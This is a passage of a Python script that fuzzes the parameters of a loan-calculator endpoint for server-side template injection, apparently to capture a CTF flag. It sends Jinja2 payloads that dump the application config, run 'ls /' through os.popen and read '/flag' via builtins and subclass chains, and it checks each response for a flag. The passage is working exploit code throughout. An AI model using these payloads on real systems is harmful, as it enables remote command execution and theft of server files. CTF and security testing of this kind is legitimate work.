parameters = ['principal', 'payment', 'term']

for param in parameters:
    print(f"\n[*] Testing parameter: {param}")
    print("-" * 50)
    
    for i, payload in enumerate(test_payloads, 1):
        # Add URL encoding for special characters
        encoded_payload = urllib.parse.quote(payload, safe='')
        
        # Default values
        params = {
            'principal': '100000',
            'payment': '2000',
            'term': '60'
        }
        
        # Inject into current parameter
        params[param] = encoded_payload
        
        try:
            url = f"{target_url}/total_loan_payments"
            response = session.get(url, params=params, timeout=10)
            
            # Extract and analyze response
            response_text = response.text
            found_flag = False
            
            # Check for flag patterns
            flag_match = re.search(r'FLAG\{[^\}]+\}', response_text)
            if flag_match:
                print(f"[!] FLAG FOUND in {param} with payload {i}!")
                print(f"[!] {flag_match.group(0)}")
                print(f"[!] Full response:\n{response_text}")
                found_flag = True
            
            # Check for interesting content
            if not found_flag and ("total" in response_text.lower() or "loan" in response_text.lower() or "payment" in response_text.lower()):
                # Normal loan calculation response
                if len(response_text) < 500:  # Only print if not too large
                    print(f"[+] {param}[{i:2d}]: Standard loan response ({len(response_text)} chars)")
            elif not found_flag and response_text:
                # Potentially interesting response (not normal loan output)
                print(f"[+] {param}[{i:2d}]: Interesting response ({len(response_text)} chars)")
                # Print part of the response to see what's happening
                snippet = response_text[:200].replace('\n', ' ')
                print(f"    Snippet: {snippet}")
            
        except Exception as e:
            print(f"[-] Error with payload {i}: {e}")

# Also test raw (non-encoded) payloads
print(f"\n[*] Testing without URL encoding (param: principal)")
print("-" * 50)

raw_payloads = [
    '{{ config }}',
    '{{ cycler.__init__.__globals__.os.popen("ls /").read() }}',
    '{{ lipsum.__globals__.__builtins__.open("/flag").read() }}',
    '{{ ""|class|mro|last|subclasses|first(open)("/flag").read() }}',
]

for i, payload in enumerate(raw_payloads, 1):
    params = {'principal': payload, 'payment': '2000', 'term': '60'}
    try:
        url = f"{target_url}/total_loan_payments"
        response = session.get(url, params=params, timeout=10)
        
        response_text = response.text
        flag_match = re.search(r'FLAG\{[^\}]+\}', response_text)
        if flag_match:
            print(f"[!] FLAG with raw payload {i}: {flag_match.group(0)}")
            print(f"[!] Full: {response_text}")
        elif "error" in response_text.lower() or "exception" in response_text.lower():
            print(f"[+] Raw[{i:2d}]: Error/exception triggered")
    except Exception as e:
        print(f"[-] Error raw payload {i}: {e}")

print("\n[*] SSTI testing completed")

